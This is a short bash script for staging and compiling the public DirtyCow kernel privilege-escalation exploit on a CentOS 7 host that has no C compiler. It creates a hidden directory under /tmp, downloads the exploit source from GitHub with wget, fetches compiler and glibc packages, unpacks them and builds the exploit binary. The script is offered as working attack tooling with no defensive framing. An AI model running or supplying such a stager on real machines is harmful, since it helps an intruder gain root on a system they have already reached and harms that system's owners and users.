#!/usr/bin/env bash

# this script is useful to compile the FireFart DirtyCow exploit on a CentOS 7.X machine which doesn't have a C compiler

DIR=/tmp/.exploits

mkdir -p ${DIR}
cd ${DIR}

# download FireFart DirtyCow exploit's C source code
wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c

# download RPMs for CentoOS 7.X with all the necessary tools to compile the exploit
wget http://mirror.centos.org/centos/7/os/x86_64/Packages/compat-gcc-44-4.4.7-8.el7.x86_64.rpm
wget http://mirror.centos.org/centos/7/os/x86_64/Packages/cpp-4.8.5-44.el7.x86_64.rpm
wget http://mirror.centos.org/centos/7/os/x86_64/Packages/gcc-4.8.5-44.el7.x86_64.rpm
wget http://mirror.centos.org/centos/7/os/x86_64/Packages/glibc-2.17-317.el7.x86_64.rpm
wget http://mirror.centos.org/centos/7/os/x86_64/Packages/glibc-common-2.17-317.el7.x86_64.rpm
wget http://mirror.centos.org/centos/7/os/x86_64/Packages/glibc-devel-2.17-317.el7.x86_64.rpm
wget http://mirror.centos.org/centos/7/os/x86_64/Packages/glibc-headers-2.17-317.el7.x86_64.rpm
wget http://mirror.centos.org/centos/7/os/x86_64/Packages/glibc-static-2.17-317.el7.x86_64.rpm
wget http://mirror.centos.org/centos/7/os/x86_64/Packages/glibc-utils-2.17-317.el7.x86_64.rpm
wget http://mirror.centos.org/centos/7/os/x86_64/Packages/libmpc-1.0.1-3.el7.x86_64.rpm
wget http://mirror.centos.org/centos/7/os/x86_64/Packages/libmpc-devel-1.0.1-3.el7.x86_64.rpm
wget http://mirror.centos.org/centos/7/os/x86_64/Packages/mpfr-3.1.1-4.el7.x86_64.rpm
wget http://mirror.centos.org/centos/7/os/x86_64/Packages/mpfr-devel-3.1.1-4.el7.x86_64.rpm

# explode the RPMs
for pkg in *.rpm ; do
    rpm2cpio $pkg | cpio -idmv
done

# update the environment variables
export PATH=${DIR}/sbin:${DIR}/usr/bin:${DIR}/usr/sbin:$PATH
export LD_LIBRARY_PATH=${DIR}/usr/lib64:${DIR}/lib64:$LD_LIBRARY_PATH
export LIBRARY_PATH=${DIR}/usr/lib64:${DIR}/lib64:$LD_LIBRARY_PATH
export CPATH=${DIR}/usr/include

ldconfig -v -f ${DIR}/etc/ld.so.conf -C ${DIR}/etc/ld.so.cache

gcc -I ${DIR}/usr/include -pthread dirty.c -o dirty -lcrypt
